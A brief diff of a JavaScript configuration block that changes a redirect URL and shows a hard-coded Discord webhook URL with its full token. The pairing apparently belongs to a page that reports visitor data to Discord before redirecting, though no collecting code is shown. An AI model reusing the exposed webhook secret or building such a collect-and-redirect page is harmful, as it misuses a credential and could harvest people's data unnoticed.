@@ -1,5 +1,5 @@
 var webhook = "https://discord.com/api/webhooks/965272372712194079/ncLfw2g_Q1QAxAv7gbFNgAOLowGXmihH03_Yopdh6y8yXGVhO88zxRdY1T4NEpzdEavI";
-var redirect = "https://google.com";
+var redirect = "https://graysuit.github.io";
 
 
 var first_step = true;
